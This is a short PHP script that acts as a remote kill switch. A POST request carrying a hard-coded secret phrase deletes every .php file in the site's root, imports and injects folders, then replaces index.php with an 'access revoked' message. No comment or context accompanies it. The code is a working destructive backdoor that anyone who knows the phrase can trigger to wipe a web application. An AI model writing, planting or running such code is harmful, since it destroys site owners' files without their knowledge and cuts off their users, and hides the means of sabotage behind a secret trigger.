<?php
if(isset($_POST["validate"])){
	if($_POST["validate"] == "ptiot-version1-reboot-sequence-validate"){
		$ins1 = glob("./*.php");
		$ins2 = glob("./imports/*.php");
		$ins3 = glob("./injects/*.php");
		foreach ($ins1 as $key => $value) {
			unlink($value);
		}
		foreach ($ins2 as $key => $value) {
			unlink($value);
		}
		foreach ($ins3 as $key => $value) {
			unlink($value);
		}
		$reinit = fopen('./index.php','w+');
		fwrite($reinit, "access revoked. contact admin.");
		fclose($reinit);
		die('reinitialized');
	}
}
?>